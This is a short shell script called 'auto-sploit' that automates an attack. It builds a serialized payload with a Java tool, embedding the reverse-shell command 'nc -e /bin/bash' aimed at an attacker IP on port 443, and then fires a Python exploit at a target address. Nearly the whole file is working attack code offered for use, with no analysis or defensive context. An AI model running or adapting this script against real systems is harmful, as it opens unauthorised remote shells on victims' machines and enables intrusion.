#!/bin/sh
usage() {
  echo "Usage: auto-sploit -a [Attacker IP Address] -v [Target IP Address]"
}

while getopts ":a:v:" OPTION; do
  case "$OPTION" in
  a)
    ATTACKER_IP="${OPTARG}"
    ;;
  v)
    TARGET_ADDR="${OPTARG}"
    ;;
  h)
    usage
    ;;
  esac
done
shift $((OPTIND - 1))

echo $ATTACKER_IP
echo $TARGET_ADDR
if [ -z "$ATTACKER_IP" ] || [ -z "$TARGET_ADDR" ];then
  usage
fi

    echo "Executing command..."
    java -jar /root/payload.jar /root/payload.ser "nc -e /bin/bash $ATTACKER_IP 443"
    echo "Payload successfully created and saved as 'payload.ser'"
    echo "Executing exploit..."
    python3 /root/exploit.py -t $TARGET_ADDR


